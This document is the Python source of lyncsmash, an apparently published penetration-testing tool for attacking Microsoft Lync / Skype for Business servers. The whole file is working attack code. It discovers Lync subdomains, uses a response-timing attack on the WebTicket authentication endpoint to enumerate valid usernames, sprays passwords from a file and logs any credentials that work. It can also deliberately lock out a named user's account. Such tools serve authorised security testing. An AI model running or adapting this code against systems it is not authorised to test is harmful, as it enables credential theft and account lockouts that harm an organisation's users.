#!/usr/bin/env python

# lyncsmash: a tool to enumerate and attack skype for business/microsoft lync installations
# https://github.com/nyxgeek/lyncsmash
#
# 2017 @nyxgeek - TrustedSec
# Special thanks to @coldfusion39 who did a big re-write of my shoddy python
# also thanks to @shellfail and @spoonman1091 for updates and fixes


import argparse
import base64
import os
import string
import random
import requests
import datetime

try:
        requests.packages.urllib3.disable_warnings()
except:
        pass

outputfile="lyncsmash.log"
validCred = False
isDisabled = False
timeout = 1.00

def main():
        parser = argparse.ArgumentParser(description='Attack Microsoft Lync installations')
        subparsers = parser.add_subparsers(dest='attack', help='Attack to perform on Lync')

        discover_parser = subparsers.add_parser('discover', help='Discover Lync subdomains')
        discover_parser.add_argument('-H', dest='host', help='Target IP address or host', required=True)

        enum_parser = subparsers.add_parser('enum', help='Enumerate valid Lync usernames')
        enum_parser.add_argument('-H', dest='host', help='Target IP address or host', required=True)
        enum_parser.add_argument('-U', dest='usernames', help='Username file', required=True)
        enum_parser.add_argument('-d', dest='domain', help='Internal domain name', required=True)
        enum_parser.add_argument('-p', dest='passwd', help='Password to attempt', required=False)
        enum_parser.add_argument('-P', dest='passwdfile', help='Password file to read from', required=False)
        enum_parser.add_argument('-o', dest='outfile', help='Output file', required=False)

        lock_parser = subparsers.add_parser('lock', help='Lock Lync user account')
        lock_parser.add_argument('-H', dest='host', help='Target IP address or host', required=True)
        lock_parser.add_argument('-u', dest='user', help='Lync user', required=True)
        lock_parser.add_argument('-d', dest='domain', help='Internal domain name', required=True)
        args = parser.parse_args()

        # Discover Lync subdomains
        if args.attack == 'discover':
                subdomain_count, findings = discover_lync(args.host)
                print_good("Found {0} Lync subdomains - {1} Lync".format(subdomain_count, findings))

        # Enumerate valid Lync usernames
        elif args.attack == 'enum':
                # check our arguments first
                if ((args.passwd, args.passwdfile) == (None, None)):
                       print_error('You need to specify either a password or a password file to use')
                       exit()
                if all((args.passwd, args.passwdfile)):
                       print_error('You cant have both a passwd file and passwd specified')
                       exit()

                if (( args.outfile ) == ( None )):
                       print_error("You need to define an output file now. Entries will be appended to 'lyncsmash.log' instead.")
                else:
                       global outputfile
                       outputfile = args.outfile

                #okay, if we have a username file, proceed
                if os.path.isfile(args.usernames):
                        # get a baseline timeout - this is response time for invalid usernames
                        global timeout
                        timeout = baseline_timeout(args.host, args.domain)
                        if timeout:
                                print_status("Average timeout is: {0}".format(timeout))
                                if (args.passwd != None):
                                    timing_attack(args.host.rstrip(), args.usernames.rstrip(), args.passwd.rstrip(), args.domain.rstrip())

                                if (args.passwdfile != None):
                                    with open(args.passwdfile) as pass_file:
                                        for password in pass_file:
                                            timing_attack(args.host.rstrip(), args.usernames.rstrip(), password.rstrip(), args.domain.rstrip())

                                    pass_file.close()

                else:
                        print_error('Could not find username file')

        # Lock user's Lync account
        elif args.attack == 'lock':
                print_status("Locking Lync account for {0}".format(args.user))
                for lock in range(1, 6):
                        try:
                                print_status("Sending request {0}".format(lock))
                                response_time = send_xml(args.host, args.domain, args.user,"n0t_y0ur_p4ss")
                        except Exception as error:
                                continue
                print_good('Lync account should now be locked')


# Discover Lync subdomains
def discover_lync(host):
        indicator_count = 0

        subdomains = [
                ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(20)),
                'dialin',
                'meet',
                'lyncdiscover',
                'scheduler',
                'access',
                'lync',
                'lyncext',
                'lyncaccess01',
                'lyncaccess',
                'lync10',
                'lyncweb',
		'sip',
		'lyncdiscoverinternal'
        ]

        for position in range(0, len(subdomains)):
                lync_url = "https://{0}.{1}".format(subdomains[position], host)
                print_status("Trying {0}.{1}".format(subdomains[position], host))
                try:
                        response = requests.get(lync_url, timeout=3, verify=False)
                        if response.status_code == 200 or response.status_code == 403:
                                if position == 0:
                                        print_warn('Found Wildcard domain - Time to GTFO')
                                        break
                                else:
                                        print_good("Found Lync domain {0}.{1}".format(subdomains[position], host))
                                        indicator_count += 1
                except Exception as error:
                        continue

        # Print Lync results
        switch = {
                0: 'No',
                1: 'Maybe',
                2: 'Probably',
                3: 'Almost definitely'
        }

        return indicator_count, switch.get(indicator_count, 'Definitely')

def timing_attack(host,userfilepath,password,domain):

    global outputfile

    with open((os.path.abspath(outputfile)),"a") as f:
        currenttime=datetime.datetime.now()
        f.write("Started lyncsmash at {0}\n".format(currenttime))
        with open(os.path.abspath(userfilepath)) as user_file:
             for user in user_file:
                 response_time = send_xml(host.rstrip(), domain.rstrip(), user.rstrip(), password.rstrip())
                 candidatevalue=float(float(response_time)/timeout)
                 if candidatevalue <= float("0.4"):
                     if isDisabled:
                         status="VALID USER, ACCOUNT DISABLED: {0}, Password: {1} Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
                         print_good(status)
                         f.write("[+] {0}\n".format(status))
                     elif validCred:
                         status="VALID CREDENTIALS: {0}, Password: {1}, Time: {2}".format(user.rstrip(), password.rstrip(),response_time)
                         print_good(status)
                         f.write("[!] {0}\n".format(status))
                     else:
                         status="VALID USER: {0}, INVALID PASSWORD: {1}, Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
                         print_good(status)
                         f.write("[+] {}\n".format(status))
                 else:
                         status="INVALID USER: {0}, Password: {1}, Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
                         print_error(status)
                         f.write("[-] {0}\n".format(status))
                 #print ''
        user_file.close()


# Determine the baseline timeout for invalid username
def baseline_timeout(host, domain):
	print_status("Performing baseline tests ... this will take a while")
        response_times = []
        for loop in range(0, 3):
                try:
                        random_user = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
                        response_time = send_xml(host, domain, random_user, "n0t_y0ur_p4ss")
                        if response_time:
                                print_status("Response time for test #{0} is {1}".format((loop+1),response_time))
                                response_times.append(float(response_time))
                        else:
                                break
                except Exception as error:
                        raise Exception(error)

        # Get average timeout for invalid username
        if len(response_times) > 0:
                average_timeout = sum(response_times) / len(response_times)
        else:
                average_timeout = None

        return average_timeout


# Send Lync request
def send_xml(host, domain, user, passwd):
        global validCred
        global isDisabled
        domain_user = "{0}\\{1}".format(domain, user)
        encoded_username = base64.b64encode(domain_user.encode('ascii'))
        encoded_password = base64.b64encode(passwd.encode('ascii'))


        xml_data = "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Header><Security s:mustUnderstand=\"1\" xmlns:u=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\" xmlns=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\"><UsernameToken><Username>{0}</Username><Password Type=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText\">{1}</Password></UsernameToken></Security></s:Header><s:Body><RequestSecurityToken xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" Context=\"ec86f904-154f-0597-3dee-59eb1b51e731\" xmlns=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\"><TokenType>urn:component:Microsoft.Rtc.WebAuthentication.2010:user-cwt-1</TokenType><RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</RequestType><AppliesTo xmlns=\"http://schemas.xmlsoap.org/ws/2004/09/policy\"><EndpointReference xmlns=\"http://www.w3.org/2005/08/addressing\"><Address>https://2013-lync-fe.contoso.com/WebTicket/WebTicketService.svc/Auth</Address></EndpointReference></AppliesTo><Lifetime><Created xmlns=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\">2016-06-07T02:23:36Z</Created><Expires xmlns=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\">2016-06-07T02:38:36Z</Expires></Lifetime><KeyType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/SymmetricKey</KeyType></RequestSecurityToken></s:Body></s:Envelope>".format(encoded_username,encoded_password)

        headers = {'Content-Type': 'text/xml; charset=utf-8','User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0'}
        try:
                #print xml_data
                lync_url = "https://{0}/WebTicket/WebTicketService.svc/Auth".format(host)
                webholder = requests.post(lync_url, headers=headers, data=xml_data, verify=False)
                if 'No valid' in webholder.text:
                    validCred = False
                    isDisabled = False
		elif 'account is disabled' in webholder.text:
                    validCred = False
                    isDisabled = True
                    #print_disabled(domain_user.rstrip())
                else:
                    isDisabled = False
                    # this will eventually be switchable with verbose or debug flag
                    #print_status(webholder.text)
                    validCred = True
                response_time = str(webholder.elapsed.total_seconds())
                status_code = webholder.status_code
                #print "Received status code " + str(status_code)
                if int(status_code) == 200:
                        print_success(domain_user.rstrip(),passwd.rstrip())
                elif int(status_code) == 404:
                        print_error('GETTING 404s OVER HERE!')
                        return None
                elif int(status_code) == 403:
                        print_error('RECEIVING 403 FORBIDDEN - WRONG SERVER OR IT IS MS-HOSTED')
                        return None
                elif int(status_code) == 401:
                        print_error('RECEIVING 401 AUTH PROMPT, SOMETHING IS UP, TEST WebTicket URL MANUALLY')
                        return None
        except Exception as error:
                return None

        return response_time

def print_success(username,password):
        print("\033[1m\033[32m[+]\033[0m RETURNED STATUS 200: VALID USER {0} with PASS {1}".format(username,password))

def print_error(msg):
        print("\033[1m\033[31m[-]\033[0m {0}".format(msg))


def print_status(msg):
        print("\033[1m\033[34m[*]\033[0m {0}".format(msg))


def print_good(msg):
        print("\033[1m\033[32m[+]\033[0m {0}".format(msg))


def print_warn(msg):
        print("\033[1m\033[33m[!]\033[0m {0}".format(msg))


if __name__ == '__main__':
        main()
	
